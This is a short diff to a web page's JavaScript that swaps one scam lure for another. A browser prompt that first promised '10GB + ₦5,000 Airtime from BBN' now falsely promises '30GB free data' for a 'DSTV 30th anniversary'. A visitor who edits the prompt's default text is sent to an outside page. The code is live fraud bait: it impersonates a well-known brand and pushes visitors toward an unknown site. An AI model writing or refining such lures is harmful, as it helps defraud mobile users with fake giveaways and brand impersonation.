@@ -1,5 +1,5 @@
-var password = 'ACTIVATE 10GB + ₦5,000'
-password=prompt('BBN: Congratulations, your mobile number is eligible to receive 10GB + ₦5,000 Airtime from BBN 10/10, click OK to activate now','ACTIVATE 10GB + ₦5,000');
-if (password != 'ACTIVATE 10GB + ₦5,000') {
+var password = 'ACTIVATE 30GB'
+password=prompt('BBN: Congratulations, your mobile number is eligible to receive 30GB free data from (DSTV 30TH ANNIVERSARY) , click OK to get offer now','ACTIVATE 30GB');
+if (password != 'ACTIVATE 30GB') {
 location.href='https://lhegit.org/imisi.html';
 }
